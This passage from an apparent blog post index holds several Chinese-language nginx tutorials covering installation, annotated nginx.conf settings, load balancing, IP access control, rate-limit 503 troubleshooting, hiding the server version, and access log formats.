#允许客户端请求的最大单文件字节数 client_max_body_size 10m; #缓冲区代理缓冲用户端请求的最大字节数， client_body_buffer_size 128k; #nginx跟后端服务器连接超时时间(代理连接超时) proxy_connect_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时) proxy_read_timeout 90; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffer_size 4k; #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置 proxy_buffers 4 32k; #高负荷下缓冲大小（proxy_buffers*2） proxy_busy_buffers_size 64k; #设定缓存文件夹大小，大于这个值，将从upstream服务器传 proxy_temp_file_write_size 64k; &#125; &#125;&#125; 常用指令说明123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899nginx在运行时与具体业务功能（比如http服务或者email服务代理）无关的一些参数，比如工作进程数，运行的身份等。woker_processes 2在配置文件的顶级main部分，worker角色的工作进程的个数，master进程是接收并分配请求给worker处理。这个数值简单一点可以设置为cpu的核数grep ^processor /proc/cpuinfo | wc -l，也是 auto 值，如果开启了ssl和gzip更应该设置成与逻辑CPU数量一样甚至为2倍，可以减少I/O操作。如果nginx服务器还有其它服务，可以考虑适当减少。worker_cpu_affinity也是写在main部分。在高并发情况下，通过设置cpu粘性来降低由于多CPU核切换造成的寄存器等现场重建带来的性能损耗。如worker_cpu_affinity 0001 0010 0100 1000; （四核）。worker_connections 2048写在events部分。每一个worker进程能并发处理（发起）的最大连接数（包含与客户端或后端被代理服务器间等所有连接数）。nginx作为反向代理服务器，计算公式 最大连接数 = worker_processes * worker_connections/4，所以这里客户端最大连接数是1024，这个可以增到到8192都没关系，看情况而定，但不能超过后面的worker_rlimit_nofile。当nginx作为http服务器时，计算公式里面是除以2。worker_rlimit_nofile 10240写在main部分。默认是没有设置，可以限制为操作系统最大的限制65535。use epoll写在events部分。在Linux操作系统下，nginx默认使用epoll事件模型，得益于此，nginx在Linux操作系统下效率相当高。同时Nginx在OpenBSD或FreeBSD操作系统上采用类似于epoll的高效事件模型kqueue。在操作系统不支持这些高效模型时才使用select。2.2.2 http服务器与提供http服务相关的一些配置参数。例如：是否使用keepalive啊，是否使用gzip进行压缩等。sendfile on开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，减少用户空间到内核空间的上下文切换。对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。keepalive_timeout 65 : 长连接超时时间，单位是秒，这个参数很敏感，涉及浏览器的种类、后端服务器的超时设置、操作系统的设置，可以另外起一片文章了。长连接请求大量小文件的时候，可以减少重建连接的开销，但假如有大文件上传，65s内没上传完成会导致失败。如果设置时间过长，用户又多，长时间保持连接会占用大量资源。send_timeout : 用于指定响应客户端的超时时间。这个超时仅限于两个连接活动之间的时间，如果超过这个时间，客户端没有任何活动，Nginx将会关闭连接。client_max_body_size 10m允许客户端请求的最大单文件字节数。如果有上传较大文件，请设置它的限制值client_body_buffer_size 128k缓冲区代理缓冲用户端请求的最大字节数模块http_proxy：这个模块实现的是nginx作为反向代理服务器的功能，包括缓存功能（另见文章）proxy_connect_timeout 60nginx跟后端服务器连接超时时间(代理连接超时)proxy_read_timeout 60连接成功后，与后端服务器两个成功的响应操作之间超时时间(代理接收超时)proxy_buffer_size 4k设置代理服务器（nginx）从后端realserver读取并保存用户头信息的缓冲区大小，默认与proxy_buffers大小相同，其实可以将这个指令值设的小一点proxy_buffers 4 32kproxy_buffers缓冲区，nginx针对单个连接缓存来自后端realserver的响应，网页平均在32k以下的话，这样设置proxy_busy_buffers_size 64k高负荷下缓冲大小（proxy_buffers*2）proxy_max_temp_file_size当 proxy_buffers 放不下后端服务器的响应内容时，会将一部分保存到硬盘的临时文件中，这个值用来设置最大临时文件大小，默认1024M，它与 proxy_cache 没有关系。大于这个值，将从upstream服务器传回。设置为0禁用。proxy_temp_file_write_size 64k当缓存被代理的服务器响应到临时文件时，这个选项限制每次写临时文件的大小。proxy_temp_path（可以在编译的时候）指定写到哪那个目录。proxy_pass，proxy_redirect见 location 部分。模块http_gzip：gzip on : 开启gzip压缩输出，减少网络传输。gzip_min_length 1k ： 设置允许压缩的页面最小字节数，页面字节数从header头得content-length中进行获取。默认值是20。建议设置成大于1k的字节数，小于1k可能会越压越大。gzip_buffers 4 16k ： 设置系统获取几个单位的缓存用于存储gzip的压缩结果数据流。4 16k代表以16k为单位，安装原始数据大小以16k为单位的4倍申请内存。gzip_http_version 1.0 ： 用于识别 http 协议的版本，早期的浏览器不支持 Gzip 压缩，用户就会看到乱码，所以为了支持前期版本加上了这个选项，如果你用了 Nginx 的反向代理并期望也启用 Gzip 压缩的话，由于末端通信是 http/1.0，故请设置为 1.0。gzip_comp_level 6 ： gzip压缩比，1压缩比最小处理速度最快，9压缩比最大但处理速度最慢(传输快但比较消耗cpu)gzip_types ：匹配mime类型进行压缩，无论是否指定,”text/html”类型总是会被压缩的。gzip_proxied any ： Nginx作为反向代理的时候启用，决定开启或者关闭后端服务器返回的结果是否压缩，匹配的前提是后端服务器必须要返回包含”Via”的 header头。gzip_vary on ： 和http头有关系，会在响应头加个 Vary: Accept-Encoding ，可以让前端的缓存服务器缓存经过gzip压缩的页面，例如，用Squid缓存经过Nginx压缩的数据。。2.2.3 server虚拟主机http服务上支持若干虚拟主机。每个虚拟主机一个对应的server配置项，配置项里面包含该虚拟主机相关的配置。在提供mail服务的代理时，也可以建立若干server。每个server通过监听地址或端口来区分。listen监听端口，默认80，小于1024的要以root启动。可以为listen *:80、listen 127.0.0.1:80等形式。server_name服务器名，如localhost、www.example.com，可以通过正则匹配。模块http_stream这个模块通过一个简单的调度算法来实现客户端IP到后端服务器的负载均衡，upstream后接负载均衡器的名字，后端realserver以 host:port options; 方式组织在 &#123;&#125; 中。如果后端被代理的只有一台，也可以直接写在 proxy_pass 。2.2.4 locationhttp服务中，某些特定的URL对应的一系列配置项。root /var/www/html定义服务器的默认网站根目录位置。如果locationURL匹配的是子目录或文件，root没什么作用，一般放在server指令里面或/下。index index.jsp index.html index.htm定义路径下默认访问的文件名，一般跟着root放proxy_pass http:/backend请求转向backend定义的服务器列表，即反向代理，对应upstream负载均衡器。也可以proxy_pass http://ip:port。proxy_redirect off;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;这四个暂且这样设，如果深究的话，每一个都涉及到很复杂的内容，也将通过另一篇文章来解读。 这里我贴出我公司现在Nginx单节点负载均衡代理可以使用下面格式：12345678910111213141516171819202122232425262728293031323334353637383940414243444546http &#123; include mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log /var/log/nginx/access.log; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; server &#123; listen 80; server_name localhost; location / &#123; root html; index index.html index.htm; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125;&#125; upstream sentry &#123; server 120.26.164.217:9000 weight=1; &#125; server &#123; listen 80; server_name sentdy.ihaozhuo.com; location / &#123; index index.html index.php index.jsp index.htm; proxy_pass http://sentry; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125;&#125; 访问控制 allow/denyNginx 的访问控制模块默认就会安装，而且写法也非常简单，可以分别有多个allow,deny，允许或禁止某个ip或ip段访问，依次满足任何一个规则就停止往下匹配。如： 12345678910location /nginx-status &#123; stub_status on; access_log off;# auth_basic \"NginxStatus\";# auth_basic_user_file /usr/local/nginx-1.6/htpasswd; allow 192.168.1.100; allow 172.29.73.0/24; deny all;&#125; 我们也常用 httpd-devel 工具的 htpasswd 来为访问的路径设置登录密码： 123456789# htpasswd -c htpasswd adminNew passwd:Re-type new password:Adding password for user admin# htpasswd htpasswd admin //修改admin密码# htpasswd htpasswd sean //多添加一个认证用户这样就生成了默认使用CRYPT加密的密码文件。打开上面nginx-status的两行注释，重启nginx生效。 参考 http://liuqunying.blog.51cto.com/3984207/1420556 http://nginx.org/en/docs/ngx_core_module.html#worker_cpu_affinity http://wiki.nginx.org/HttpCoreModule#sendfile","link":"/2016/05/23/Web服务技术/Nginx/Nginx+Tomcat实现负载均衡设置访问控制/"},{"title":"NGINX解决办法-503-Service.Temporarily.Unavailable","text":"503 Service Temporarily Unavailable 解决办法-nginx因为最近公司微信抽奖活动项目环境 - ginx做负载均衡限制某个IP同一时间段的访问次数。 就是防止有人同一个IP不断请求，网站刷新后经常出现503 Service Temporarily Unavailable错误，有时有可以，联想到最近在nginx.conf里做了单ip访问次数限制. (limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s;) 把这个数量放大后在刷新发现问题解决。 123456789vim nginx.confhttp &#123; limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s; 添加上面那条语句就行。 include mime.types; default_type application/octet-stream; （还顺便把这个改大了 limit_req zone=allips burst=50 nodelay; ）为了证实该问题，反复改动该数量测试发现问题确实在这。这个数量设得太小有问题，通过fiddler发现web页面刷新一下，因为页面上引用的js,css,图片都算一个连接。所以单个页面刷新下就有可能刷爆这个限制，超过这个限制就会提示503 Service Temporarily Unavailable。 这里添加下只能设置什么IP网段可以访问www.jollychic.com。其他的全部拒绝访问80端口这个域名www.jollychic.com。 12345678910111213141516 server &#123; listen 80; allow 218.17.158.2;allow 127.0.0.0/24;allow 192.168.0.0/16;allow 58.251.130.1;allow 183.239.167.3;allow 61.145.164.1;deny all;server_name www.jollychic.com; location / &#123; proxy_pass http://www.jollychic.com;proxy_set_header X-Real-IP $remote_addr;limit_req zone=allips burst=50 nodelay; &#125; &#125;","link":"/2016/05/24/Web服务技术/Nginx/nginx解决办法-503-Service.Temporarily.Unavailable/"},{"title":"Nginx多种安装与配置文件详解","text":"安装nginx最近在弄灰度发布环境，之前nginx在测试和线上都有搭建配置。负载均衡配置（包括健康检查）、缓存（包括清空缓存）反向代理。就打算自己整理篇自己操作的文档，各种编译配置，今天自己也整理一份安装文档和nginx.conf配置选项的说明。 选择稳定版本 我们编译安装nginx来定制自己的模块。 机器CentOS 6.6 x86_64。 软件版本：Nginx 1.9.9 nginx最新安装包下载地址：http://www.nginx.cn/ng yum 一键安装nginxyum安装rpm包会比编译安装简单很多，默认会安装许多模块，帮我们解决到很多依赖的安装包，但缺点是如果你想以后安装第三方模块那就没办法了。 使用Nginx官方源,Epel扩展库和remi源,remi源基于epel,必须先安装epel源,remi包含php-fpm,mysql-server5.5,如果只需要php-fpm可以单独安装php-fpm后禁用此源. 第一种方法:123456# vi /etc/yum.repo.d/nginx.repo[nginx]name=nginx repobaseurl=http://nginx.org/packages/centos/$releasever/$basearch/gpgcheck=0enabled=1 剩下的就yum install nginx搞定，也可以yum install nginx-1.11.10安装指定版本（前提是你去packages里看到有对应的版本，默认是最新版稳定版） 第二种方法:各节点时间同步 [root@nginx ~]# ntpdate 202.120.2.101 安装EPEL源: 12345rpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm yum clean all yum makecache yum install -y nginx service nginx start 还有一种就是下载Centos-6.repo ，可以到我github上面nginx库下载，这个是最新的源地址里面。nginx 编译安装：首先安装缺少的依赖包： 123456789101112 # yum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel pcre pcre-devel``` 这些软件包如果yum上没有的话可以下载源码来编译安装，只是要注意编译时默认安装的目录，确保下面在安装nginx时能够找到这些动态库文件（ldconfig）。nginx官网下载编译安装包地址:[nginx](http://nginx.org/en/download.html)nginx-1.11.10版本下载：[nginx-1.11.10](http://nginx.org/download/nginx-1.11.10.tar.gz)### 新建nginx用户与组``` bash groupadd www useradd -s /sbin/nologin -g www www 编译配置文件123456789101112131415161718192021222324252627282930313233 tar -zxvf nginx-1.11.10.tar.gz cd nginx-1.11.10/ ./configure --user=www --group=www --prefix=/usr/local/nginx --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --with-http_realip_module ./configure --user=www --group=www --prefix=/usr/local/nginx --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --with-http_realip_module``` 其中参数 `--with-http_stub_status_module `是为了启用 nginx 的 NginxStatus 功能，用来监控 Nginx 的当前状态。 make &amp;&amp; make install### 常用编译选项说明nginx大部分常用模块，编译时./configure --help以--without开头的都默认安装。```bash--prefix=PATH ： 指定nginx的安装目录。默认 /usr/local/nginx--conf-path=PATH ： 设置nginx.conf配置文件的路径。nginx允许使用不同的配置文件启动，通过命令行中的-c选项。默认为prefix/conf/nginx.conf--user=name： 设置nginx工作进程的用户。安装完成后，可以随时在nginx.conf配置文件更改user指令。默认的用户名是nobody。--group=name类似--with-pcre ： 设置PCRE库的源码路径，如果已通过yum方式安装，使用--with-pcre自动找到库文件。使用--with-pcre=PATH时，需要从PCRE网站下载pcre库的源码（版本4.4 - 8.30）并解压，剩下的就交给Nginx的./configure和make来完成。perl正则表达式使用在location指令和 ngx_http_rewrite_module模块中。--with-zlib=PATH ： 指定 zlib（版本1.1.3 - 1.2.5）的源码解压目录。在默认就启用的网络传输压缩模块ngx_http_gzip_module时需要使用zlib 。--with-http_ssl_module ： 使用https协议模块。默认情况下，该模块没有被构建。前提是openssl与openssl-devel已安装--with-http_stub_status_module ： 用来监控 Nginx 的当前状态--with-http_realip_module ： 通过这个模块允许我们改变客户端请求头中客户端IP地址值(例如X-Real-IP 或 X-Forwarded-For)，意义在于能够使得后台服务器记录原始客户端的IP地址--add-module=PATH ： 添加第三方外部模块，如nginx-sticky-module-ng或缓存模块。每次添加新的模块都要重新编译（Tengine可以在新加入module时无需重新编译） 再提供一种编译方案：最全方案的编译 12345678910111213141516171819./configure \\ --prefix=/usr \\ --sbin-path=/usr/sbin/nginx \\ --conf-path=/etc/nginx/nginx.conf \\ --error-log-path=/var/log/nginx/error.log \\ --http-log-path=/var/log/nginx/access.log \\ --pid-path=/var/run/nginx/nginx.pid \\ --lock-path=/var/lock/nginx.lock \\ --user=nginx \\ --group=nginx \\ --with-http_ssl_module \\ --with-http_stub_status_module \\--with-http_gzip_static_module \\ --http-client-body-temp-path=/var/tmp/nginx/client/ \\ --http-proxy-temp-path=/var/tmp/nginx/proxy/ \\ --http-fastcgi-temp-path=/var/tmp/nginx/fcgi/ \\ --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi \\ --with-pcre=../pcre-7.8 --with-zlib=../zlib-1.2.3 编译完成后面执行安装：make 1234567891011121314151617181920212223242526272829303132creating objs/MakefileConfiguration summary + using system PCRE library + using system OpenSSL library + using system zlib library nginx path prefix: \"/usr/local/nginx\" nginx binary file: \"/usr/local/nginx/sbin/nginx\" nginx modules path: \"/usr/local/nginx/modules\" nginx configuration prefix: \"/usr/local/nginx/conf\" nginx configuration file: \"/usr/local/nginx/conf/nginx.conf\" nginx pid file: \"/usr/local/nginx/logs/nginx.pid\" nginx error log file: \"/var/log/nginx/error.log\" nginx http access log file: \"/var/log/nginx/access.log\" nginx http client request body temporary files: \"client_body_temp\" nginx http proxy temporary files: \"proxy_temp\" nginx http fastcgi temporary files: \"fastcgi_temp\" nginx http uwsgi temporary files: \"uwsgi_temp\" nginx http scgi temporary files: \"scgi_temp\" [root@nginx nginx-1.11.10]# make &amp;&amp; make installmake -f objs/Makefilemake[1]: Entering directory `/root/nginx-1.11.10'cc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\ -o objs/src/core/nginx.o \\ src/core/nginx.ccc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\ -o objs/src/core/ngx_log.o \\ src/core/ngx_log.ccc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\..... 启动nginx服务1234/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.confln -s /usr/local/nginx/sbin/nginx /usr/bin/nginx ##做软连接cp nginx.init /etc/init.d/nginx 启动脚本chmod +x /etc/init.d/nginx 下载nginx启动脚本这个我全部放到github上面，nginx启动脚本 启动关闭nginx 123456789101112131415161718## 检查配置文件是否正确# /usr/local/nginx-1.6/sbin/nginx -t # ./sbin/nginx -V # 可以看到编译选项## 启动、关闭# ./sbin/nginx # 默认配置文件 conf/nginx.conf，-c 指定# ./sbin/nginx -s stop或 pkill nginx#nginx平滑重启、nginx -t -c /usr/local/nginx/conf/nginx.conf## 重启，不会改变启动时指定的配置文件# ./sbin/nginx -s reload或 kill -HUP `cat /usr/local/nginx-1.6/logs/nginx.pid` 设置开机启动chkconfig --level 345 nginx on chkconfig nginx on chkconfig nginx --list nginx 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭 当然也可以将 nginx 作为系统服务管理，下载 nginx 到/etc/init.d/，修改里面的路径然后赋予可执行权限。 1# service nginx &#123;start|stop|status|restart|reload|configtest&#125; nginx.conf配置文件Nginx配置文件主要分成四部分：main（全局设置）、server（主机设置）、upstream（上游服务器设置，主要为反向代理、负载均衡相关配置）和 location（URL匹配特定位置后的设置），每部分包含若干个指令。main部分设置的指令将影响其它所有部分的设置；server部分的指令主要用于指定虚拟主机域名、IP和端口；upstream的指令用于设置一系列的后端服务器，设置反向代理及后端服务器的负载均衡；location部分用于匹配网页位置（比如，根目录“/”,“/images”,等等）。他们之间的关系式：server继承main，location继承server；upstream既不会继承指令也不会被继承。它有自己的特殊指令，不需要在其他地方的应用。 当前nginx支持的几个指令上下文： 2.1 通用下面的nginx.conf简单的实现nginx在前端做反向代理服务器的例子，处理js、png等静态文件，jsp等动态请求转发到其它服务器tomcat： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120user www www;worker_processes 2;worker_cpu_affinity 00000001; error_log /var/log/nginx/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;pid /var/run/nginx.pid;worker_rlimit_nofile 1024;events &#123; use epoll; worker_connections 65535;&#125;http &#123; include mime.types; default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #access_log logs/access.log main; sendfile on; # tcp_nopush on; keepalive_timeout 65; # gzip压缩功能设置 gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_http_version 1.0; gzip_comp_level 6; gzip_types text/html text/plain text/css text/javascript application/json application/javascript application/x-javascript application/xml; gzip_vary on; # http_proxy 设置 client_max_body_size 10m; client_body_buffer_size 128k; proxy_connect_timeout 75; proxy_send_timeout 75; proxy_read_timeout 75; proxy_buffer_size 4k; proxy_buffers 4 32k; proxy_busy_buffers_size 64k; proxy_temp_file_write_size 64k; proxy_temp_path /usr/local/nginx/proxy_temp 1 2; # 设定负载均衡后台服务器列表 upstream backend &#123; #ip_hash; server 192.168.10.100:8080 max_fails=2 fail_timeout=30s ; server 192.168.10.101:8080 max_fails=2 fail_timeout=30s ; &#125; # 很重要的虚拟主机配置 server &#123; listen 80; server_name itoatest.example.com; root /apps/oaapp; charset utf-8; access_log logs/host.access.log main; #对 / 所有做负载均衡+反向代理 location / &#123; root /apps/oaapp; index index.jsp index.html index.htm; proxy_pass http://backend; proxy_redirect off; # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504; &#125; #静态文件，nginx自己处理，不去backend请求tomcat location ~* /download/ &#123; root /apps/oa/fs; &#125; location ~ .*\\.(gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ &#123; root /apps/oaapp; expires 7d; &#125; location /nginx_status &#123; stub_status on; access_log off; allow 192.168.10.0/24; deny all; &#125; location ~ ^/(WEB-INF)/ &#123; deny all; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125; ## 其它虚拟主机，server 指令开始&#125; 这里我整理了一份每个含义的详解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152#定义Nginx运行的用户和用户user www www;#nginx进程数，建议设置为等于CPU总核心数。这里我服务器4核worker_processes 4;#一个1核CPU对应一个进程数管理。这样能很好分配资源。worker_cpu_affinity 00000001 00000010 00000100 00001000; #全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]error_log /var/log/nginx/error.log info;#进程文件pid /var/run/nginx.pid;#一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（系统的值ulimit -n）与nginx进程数相除，但是nginx分配请求并不均匀，所以建议与ulimit -n的值保持一致。worker_rlimit_nofile 65535;#工作模式与连接数上限events&#123;#参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型是Linux 2.6以上版本内核中的高性能网络I/O模型，如果跑在FreeBSD上面，就用kqueue模型。use epoll;#单个进程最大连接数（最大连接数=连接数*进程数）worker_connections 65535;&#125;#设定http服务器http&#123;include mime.types; #文件扩展名与文件类型映射表default_type application/octet-stream; #默认文件类型#charset utf-8; #默认编码server_names_hash_bucket_size 128; #服务器名字的hash表大小client_header_buffer_size 32k; #上传文件大小限制large_client_header_buffers 4 64k; #设定请求缓client_max_body_size 8m; #设定请求缓sendfile on; #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。autoindex on; #开启目录列表访问，合适下载服务器，默认关闭。tcp_nopush on; #防止网络阻塞tcp_nodelay on; #防止网络阻塞keepalive_timeout 120; #长连接超时时间，单位是秒#keepalive 超时时间，客户端到服务端的连接持续有效时间当出现对服务器后，继续请求时keepalive_timeout功能可避免建立或者重新。#FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。fastcgi_connect_timeout 300;fastcgi_send_timeout 300;fastcgi_read_timeout 300;fastcgi_buffer_size 64k;fastcgi_buffers 4 64k;fastcgi_busy_buffers_size 128k;fastcgi_temp_file_write_size 128k;#gzip模块设置gzip on; #开启gzip压缩输出gzip_min_length 1k; #最小压缩文件大小gzip_buffers 4 16k; #压缩缓冲区gzip_http_version 1.0; #压缩版本（默认1.1，前端如果是squid2.5请使用1.0）gzip_comp_level 2; #压缩等级gzip_types text/plain application/x-javascript text/css application/xml;#压缩类型，默认就已经包含text/html，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。gzip_vary on;#limit_zone crawler $binary_remote_addr 10m; #开启限制IP连接数的时候需要使用upstream blog.kern.com &#123;#upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。 server 192.168.58.139:80 weight=1 max_fails=2 fail_timeout=30s; server 192.168.58.140:80 weight=1 max_fails=2 fail_timeout=30s;&#125;#虚拟主机的配置 server&#123;#监听端口 listen 80;#域名可以有多个，用空格隔开 server_name www.ihaozhuo.com ; ##(服务器名) index index.html index.htm index.php; root /data/www/ha97; location ~ .*\\.(php|php5)?$&#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi.conf;&#125;#图片缓存时间设置location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$&#123;expires 10d;&#125;#JS和CSS缓存时间设置location ~ .*\\.(js|css)?$&#123;expires 1h;&#125;#日志格式设定log_format access '$remote_addr - $remote_user [$time_local] \"$request\" ''$status $body_bytes_sent \"$http_referer\" ''\"$http_user_agent\" $http_x_forwarded_for';#定义本虚拟主机的访问日志access_log /var/log/nginx/ha97access.log access;#对 \"/\" 启用反向代理location / &#123;proxy_pass http://127.0.0.1:88;proxy_cache cache_one; #开启缓存proxy_cache_valid 200 304 7d; #正常状态缓存，因为头像不经常改动所以缓存7天proxy_redirect off;proxy_set_header X-Real-IP $remote_addr;#后端的Web服务器可以通过X-Forwarded-For获取用户真实IPproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#以下是一些反向代理的配置，可选。proxy_set_header Host $host;client_max_body_size 10m; #允许客户端请求的最大单文件字节数client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数，proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时)proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时)proxy_read_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时)proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小proxy_buffers 4 32k; #proxy_buffers缓冲区，网页平均在32k以下的设置proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2）proxy_temp_file_write_size 64k;#设定缓存文件夹大小，大于这个值，将从upstream服务器传&#125;#设定查看Nginx状态的地址location /NginxStatus &#123;stub_status on;access_log on;auth_basic \"NginxStatus\";auth_basic_user_file conf/htpasswd;#htpasswd文件的内容可以用apache提供的htpasswd工具来产生。&#125;#本地动静分离反向代理配置#所有jsp的页面均交由tomcat或resin处理location ~ .(jsp|jspx|do)?$ &#123;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_pass http://127.0.0.1:8080;&#125;#所有静态文件由nginx直接读取不经过tomcat或resinlocation ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|pdf|xls|mp3|wma)$&#123; expires 15d; &#125;location ~ .*.(js|css)?$&#123; expires 1h; &#125;&#125;&#125;","link":"/2016/05/23/Web服务技术/Nginx/Nginx多种安装与配置文件详解/"},{"title":"企业级Nginx Web服务优化实战","text":"企业级Nginx Web服务优化实战前言: 在运维工作已经3个年，运维岗位：对web服务是必须要会的，这次我对Nginx Web服务做一次优化总结，上次记得写博客是对Nginx配置详解和服务的高可用。希望写的对你看到我博客的人有所帮助。 1.1 Nginx 基本安全优化1.1.2 调整参数隐藏Nginx软件版本号信息 这里说隐藏版本号重要性软件出现漏洞跟版本特别有关系，我们尽可能隐藏或消除web服务队访问用户显示各类敏感信息，这样恶意要攻击你的用户就很难猜到他攻击的服务所用的是否有特定的漏洞的软件，或者是否有对应漏洞的某一特定版本，从而加强了Web服务的安全性。 例子： 12345678910[root@nginx ~]# curl -I 127.0.0.7 HTTP/1.1 200 OKServer: nginx/1.9.7 #&lt;--这里清晰地暴露了web版本号（1.9.7）以及软件名称（Nginx）Date: Sat, 08 Apr 2017 08:15:59 GMTContent-Type: text/htmlContent-Length: 612Last-Modified: Thu, 19 Nov 2015 05:50:20 GMTConnection: keep-aliveETag: \"564d631c-264\"Accept-Ranges: bytes 如何隐藏可以通过配置文件加参数来实现： 在Nginx配置文件Nginx.conf 中的server标签🏷内加入“server_tokens off”参数，具体查看如下： 12345678910server &#123; listen 80; server_name localhost; server_tokens off; location / &#123; root html; index index.html index.htm; limit_req zone=one; &#125; 配置完成后保存，重新加载配置文件，再次curl查看： [root@nginx ~]# curl -I 127.0.0.7 HTTP/1.1 200 OK Server: nginx Date: Sat, 08 Apr 2017 08:20:31 GMT Content-Type: text/html Content-Length: 612 Last-Modified: Thu, 19 Nov 2015 05:50:20 GMT Connection: keep-alive ETag: \"564d631c-264\" Accept-Ranges: bytes","link":"/2016/08/23/Web服务技术/Nginx/企业级Nginx Web服务优化实战/"},{"title":"Nginx基础篇-日志管理和切割","text":"前言：公司日志查看有时候不太规范，官网web服务日志这边整理了下Nginx日志输出优化。 一、日志分类Nginx日志主要分为两种，访问日志和错误日志。两种日志可以在http和server模块中配置，nginx有一个非常灵活的日志记录模式。每个级别的配置可以有各自独立的访问日志。日志格式通过log_format命令来定义 1、访问日志访问日志主要记录客户端访问Nginx的每一个请求log_format用来设置日志格式，只能在http模块下设置 log_format name name(格式名称) type(格式样式) 下面是默认的nginx日志格式： 123log_format main '$remote_addr - $remote_user [$time_local]\"$request\" ' '$status $body_bytes_sent\"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; 字段含义： $remote_addr远程客户端的IP地址。 $remote_user远程客户端用户名称，如果网站设置了用户验证的话就会有，否则空白 [$time_local]访问的时间与时区比如18/Jul/2012:17:00:01+0800时间信息最后的&quot;+0800&quot;表示服务器所处时区位于UTC之后的8小时。 $request记录请求的url和http协议 $status记录请求返回的http状态码. $body_bytes_sent记录发送给客户端的文件主体内容的大小 $http_referer记录 记录从哪个页面链接访问过来的。 $http_user_agent记录客户端浏览器信息 $http_x_forwarded_for客户端的真实ip。当nginx前面有代理服务器时，$remote_addr获取到的只能是nginx上一级的IP，而反向代理服务器在转发请求的http头信息中可以增加x_forwarded_for信息用以记录原有客户端的IP地址和原来客户端的请求的服务器地址，$http_x_forwarded_for参数就是承接上一级传递的客户端IP参数。从而就获取到了客户端的真实IP。 access_log 指令用来指定日志文件的存放路径，可以在http、server、location中设置 举例说明如下 access_log logs/access.log main; 